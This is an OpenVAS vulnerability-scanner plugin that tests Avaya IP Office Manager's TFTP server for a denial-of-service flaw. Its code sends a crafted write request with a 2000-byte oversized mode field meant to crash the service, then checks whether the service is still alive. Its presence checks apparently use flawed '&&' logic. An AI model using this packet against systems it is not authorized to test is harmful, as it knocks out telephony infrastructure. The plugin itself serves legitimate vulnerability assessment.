###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_avaya_ip_office_mgr_tftp_dos.nasl 13 2013-10-27 12:16:33Z jan $
#
# Avaya IP Office Manager TFTP Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow unauthenticated attackers to cause the
  application to crash.
  Impact Level: Application";
tag_affected = "Avaya Ip Office Manager 8.1, Other versions may also be affected.";
tag_insight = "The flaw is due to an error while handling certain crafted TFTP write
  requests, which can be exploited by remote unauthenticated attackers to crash
  an affected application";
tag_solution = "No solution or patch is available as of 08th April 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.avaya.com/usa/product/ip-office?view=features-benefits";
tag_summary = "The host is running Avaya IP Office Manager TFTP Server and is prone to
  denial of service vulnerability.";

if(description)
{
  script_id(802011);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
  script_bugtraq_id(47021);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_name("Avaya IP Office Manager TFTP Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/71282");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43819");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17045/");

  script_description(desc);
  script_summary("Determine if Avaya IP Office Manager TFTP is prone to denial of service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl");
  script_require_keys("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("tftp.inc");

## Check fot tftp service
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Check Port State
if(!get_udp_port_state(port)){
  exit(0);
}

## Access bin.cfg file and check it's contents
## to confirm it's Avaya TFTP
res = tftp_get(port:port, path:"bin.cfg");
if(isnull(res) && "avaya" >!< res) {
  exit(0);
}

## Create a crafted write request
crash = crap(data: "A", length: 2000);
req = raw_string( 0x00, 0x02 ) + ## Write Request Opcode
      "A" + raw_string( 0x00) +  ## Destination file name
      crash + raw_string( 0x00); ## Crafted "type"

## Create UDP scoket
soc = open_sock_udp(port);
if(!soc){
  exit(0);
}

## Send Crafted UDP Packet to Avaya TFTP
send(socket:soc, data:req);
info = recv(socket:soc, length:1024);

## Check TFTP is still Alive or not
res = tftp_get(port:port, path:"bin.cfg");
if(isnull(res) && "avaya" >!< res) {
  security_hole(port);
}
